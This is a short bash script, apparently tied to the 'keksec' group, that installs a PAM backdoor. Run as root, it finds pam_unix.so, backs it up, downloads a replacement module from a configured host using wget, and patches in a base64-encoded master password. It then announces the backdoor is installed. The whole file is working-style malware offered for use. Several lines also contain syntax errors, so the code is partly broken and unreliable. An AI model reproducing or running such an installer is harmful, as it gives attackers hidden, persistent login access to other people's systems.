#!/bin/bash

HOST="http://example.com/"

# Don't change this!!!
# keksec
DEFAULT_PASSWORD="a2Vrc2VjICAgICAgICAgICAgICAgICAgICAgICAgICA"

if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

make_backup () {
    cp ${1} ${1}.bak
    if [ ${?} -nq 0 ]; then
        echo "Failed making backup of pam_unix.so!"
        exit
    fi
}

find_pam () {
    pam="$(find /lib/ -name pam_unix.so -print 2>/dev/null)"
    if [ -z ${pam} ]; then
        echo "Failed to find pam_unix.so!"
        exit
    else
        echo ${pam}
    fi
}

get_pam () {
    wget "${HOST}${1}" -O ${pam}
    if [ ${?} -nq 0]; then
        echo "Failed to install pam_unix.so!"
        exit
    fi
}

md5_sum () {
    md5="$(md5sum ${1} | awk '{ print $1 }' )"
    if [ -z ${md5} ]; then
        echo "Failed to calculate MD5 sum!"
        exit
    else
        echo ${md5}
    fi
}

set_password () {
	b64="$(printf %-32.32s ${$1} | base64)"
	if [ -z ${b64} ]; then
		echo "Failed to base64 encode password!"
		exit
	else
		echo ${b64}
	fi

	perl -pi -e "s/${DEFAULT_PASSWORD}/${b64}/g" ${pam}
	if [ ${?} -nq 0]; then
		echo "Failed to change password!"
		exit
	fi
}

main () {
    echo "Finding pam_unix.so..."
    find_pam

    echo "Calculating MD5 sum..."
    md5_sum ${pam}

    echo "Making backup in case something fails..."
    make_backup ${pam}
    echo "Backup created: ${pam}.bak"

    echo "Downloading and replacing pam..."
    get_pam ${md5}

    if [ -n "${1}" ]; then
    	echo "Setting password..."
    	set_password ${1}
    fi
    
    echo "Backdoor installed successfully!"
}

if [ $# -eq 0]; then
	echo "No password supplied, using default."
	main
else
	if [ ${#1} -ge 32 ]; then
		echo "Password can't be longer than 32 characters!"
		exit
	else
		main ${1}
	fi
fi
